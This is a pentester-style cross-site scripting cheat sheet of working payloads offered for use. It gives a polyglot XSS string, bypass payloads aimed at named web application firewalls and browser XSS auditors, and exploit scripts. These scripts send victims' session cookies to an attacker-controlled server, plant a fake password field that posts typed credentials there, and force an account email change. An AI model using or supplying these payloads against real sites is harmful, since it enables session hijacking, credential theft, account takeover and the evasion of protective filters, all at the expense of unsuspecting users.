# XSS

List of exploitable JS functions: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

List of XSS payloads: [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all)

Polyglot field test

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## WAF Bypass

### Google Chrome Payloads

#### Google XSS Audit Bypass

```
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

#### Chrome < v60 beta XSS-Auditor Bypass

```
<script src="data:,alert(1)%250A-->
```

#### Other Google Audit Bypass Payloads

```
<script>alert(1)</script
<script>alert(1)%0d%0a-->%09</script
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

### Safari

```
<script>location.href;'javascript:alert%281%29'</script>
```

### Kona WAF (Akamai) Bypass&#xD;

```
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

### Wordfence&#x20;

```
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

### Incapsula WAF

```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```



## Exploits

### Cookie Stealing

Create an instance of server listening on a public port. After sending the following payload to the target you will see a request to your server containing the session cookies

```
<script>
fetch('<server>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Password Stealing

Create an instance of server listening on a public port. Send the following payload to create a fake form on the target server. When the victim types the password a request will be sent to your server containing the password

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('<server>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### CSRF

Use the following payload to send a request using AJAX to a page of the application. Can be used for instance to request  password reset for the user

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','<URL>',true);
req.send();
function handleResponse() {
    var target = new XMLHttpRequest();
    target .open('post', '/my-account/change-email', true);
    target .send(<body>)
};
</script>
```

